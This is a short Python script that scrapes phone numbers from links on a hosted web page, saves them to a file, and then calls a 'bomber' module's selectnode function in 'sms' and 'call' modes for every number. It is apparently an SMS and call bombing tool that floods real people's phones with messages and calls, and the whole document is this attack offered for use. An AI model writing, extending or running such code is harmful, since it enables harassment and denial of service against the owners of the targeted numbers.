import requests

from bs4 import BeautifulSoup
 

urls = 'https://crazyboysofagv.000webhostapp.com/numbers/'

grab = requests.get(urls)

soup = BeautifulSoup(grab.text, 'html.parser')
 
# opening a file in write mode

f = open("number.txt", "w")
# traverse paragraphs from soup

for link in soup.find_all("a"):

   data = link.get('href')

   f.write(data)
   print(data)
   f.write("\n")
 
f.close()

from bomber import selectnode
with open('number.txt','r') as number:
  for i in number:
      selectnode(mode='sms', num=i)
      selectnode(mode='call', num=i)
